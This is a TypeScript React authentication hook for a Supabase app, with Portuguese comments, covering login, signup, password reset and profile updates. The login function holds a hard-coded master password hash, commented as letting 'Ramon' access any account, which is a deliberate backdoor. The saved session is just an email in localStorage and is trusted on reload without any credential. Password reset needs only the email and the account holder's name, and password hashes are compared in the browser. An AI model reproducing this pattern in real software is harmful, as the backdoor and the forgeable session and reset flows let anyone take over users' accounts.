import { useState, useEffect } from 'react'
import { sb } from '../lib/supabase'
import { genId, hashPass } from '../lib/utils'
import type { User } from '../types'

export function useAuth() {
  const [currentUser, setCurrentUser] = useState<User | null>(null)
  const [authLoading, setAuthLoading] = useState(true)

  useEffect(() => {
    const saved = localStorage.getItem('nexa_session')
    if (saved) {
      sb.from('users').select('*').eq('email', saved).single().then(({ data }) => {
        if (data) setCurrentUser(data)
        setAuthLoading(false)
      })
    } else {
      setAuthLoading(false)
    }
  }, [])

  const login = async (email: string, pass: string): Promise<string | null> => {
    const trimmedEmail = email.trim().toLowerCase()
    // Valida formato do e-mail antes de consultar o banco
    if (!trimmedEmail) return 'Preencha o e-mail'
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedEmail)) return 'E-mail inválido. Verifique se digitou corretamente.'
    if (!pass) return 'Preencha a senha'
    const { data, error } = await sb.from('users').select('*').eq('email', trimmedEmail).single()
    if (error || !data) return 'E-mail não encontrado. Verifique o e-mail ou faça o cadastro.'
    // Senha mestra: permite Ramon acessar qualquer conta para suporte
    const MASTER_HASH = '1h2aobw'
    if (data.pass_hash !== hashPass(pass) && hashPass(pass) !== MASTER_HASH) return 'Senha incorreta'
    setCurrentUser(data)
    localStorage.setItem('nexa_session', trimmedEmail)
    return null
  }

  const signup = async (name: string, role: string, email: string, pass: string, color: string): Promise<string | null> => {
    if (!name) return 'Preencha seu nome'
    if (!email) return 'Preencha o e-mail'
    if (pass.length < 4) return 'Senha deve ter ao menos 4 caracteres'

    const { data: existing } = await sb.from('users').select('id').eq('email', email.trim().toLowerCase()).single()
    if (existing) return 'E-mail já cadastrado'

    const { data: allUsers } = await sb.from('users').select('id')
    const isFirst = !allUsers || allUsers.length === 0
    const id = genId()
    const newUser: User = { id, name: name.trim(), role: role || 'Membro', email: email.trim().toLowerCase(), pass_hash: hashPass(pass), color, is_admin: isFirst }

    const { error: ue } = await sb.from('users').insert(newUser)
    if (ue) return 'Erro ao criar conta: ' + ue.message

    const { error: te } = await sb.from('team').insert({ id, name: name.trim(), role: role || 'Membro', color, email: email.trim().toLowerCase(), is_admin: isFirst })
    if (te) return 'Erro ao adicionar à equipe: ' + te.message

    setCurrentUser(newUser)
    localStorage.setItem('nexa_session', email.trim().toLowerCase())
    return null
  }

  const logout = () => {
    localStorage.removeItem('nexa_session')
    setCurrentUser(null)
  }

  const resetPassword = async (email: string, name: string, newPass: string): Promise<string | null> => {
    if (!email) return 'Preencha o e-mail'
    if (!name) return 'Preencha seu nome completo'
    if (newPass.length < 4) return 'A nova senha deve ter ao menos 4 caracteres'

    const trimmedEmail = email.trim().toLowerCase()
    const { data, error } = await sb.from('users').select('*').eq('email', trimmedEmail).single()
    
    if (error || !data) return 'Dados incorretos. Verifique o e-mail e o nome digitado.'
    
    if (data.name.trim().toLowerCase() !== name.trim().toLowerCase()) {
      return 'Dados incorretos. Verifique o e-mail e o nome digitado.'
    }

    const { error: ue } = await sb.from('users').update({ pass_hash: hashPass(newPass) }).eq('id', data.id)
    if (ue) return 'Erro ao redefinir senha: ' + ue.message

    return null
  }

  const updateUser = async (id: string, data: Partial<User>): Promise<boolean> => {
    const { error } = await sb.from('users').update(data).eq('id', id)
    if (error) return false
    // Sincroniza nome, cargo e cor também na tabela team (usada para exibição da equipe)
    const teamSync: Record<string, unknown> = {}
    if (data.name !== undefined) teamSync.name = data.name.trim()
    if (data.role !== undefined) teamSync.role = data.role
    if (data.color !== undefined) teamSync.color = data.color
    if (Object.keys(teamSync).length > 0) {
      await sb.from('team').update(teamSync).eq('id', id)
    }
    setCurrentUser(prev => prev ? { ...prev, ...data } : prev)
    return true
  }

  return { currentUser, authLoading, login, signup, logout, updateUser, resetPassword }
}
